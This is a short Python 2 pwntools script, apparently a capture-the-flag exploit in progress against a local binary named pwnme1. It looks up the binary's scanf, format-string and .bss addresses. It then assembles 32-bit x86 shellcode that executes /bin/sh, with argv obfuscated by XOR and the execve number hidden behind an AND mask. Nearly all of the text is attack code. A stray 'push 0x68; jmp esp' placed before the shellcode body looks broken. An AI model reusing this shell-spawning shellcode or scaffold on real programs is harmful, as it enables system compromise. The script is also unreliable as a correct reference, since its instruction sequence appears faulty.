from pwn import *
elf = ELF('/home/h11p/pwnme1')
scanf_addr = elf.symbols['__isoc99_scanf']
print "%x" % scanf_addr
scanf_fmt_addr = elf.search('%s').next()
#jmpes=elf.search()
print "%x" % scanf_fmt_addr
bss_addr = elf.bss()
print "%x" % bss_addr


shellcode =  asm("push 0x68")
shellcode +=asm("jmp esp")
shellcode += asm("push 0x732f2f2f")
shellcode += asm("push 0x6e69622f")
shellcode += asm("mov ebx, esp")
shellcode += asm("push 0x1010101")
shellcode += asm("xor dword ptr [esp], 0x1016972")
shellcode += asm("xor ecx, ecx")
shellcode += asm("push ecx")
shellcode += asm("push 4")
shellcode += asm("pop ecx")
shellcode += asm("add ecx, esp")
shellcode += asm("push ecx")
shellcode += asm("mov ecx, esp")
shellcode += asm("xor edx, edx")
shellcode += asm("push 0x1b")
shellcode += asm("and byte ptr [esp], 0xf")
shellcode += asm("pop eax")
shellcode += asm("int 0x80")
print disasm(shellcode)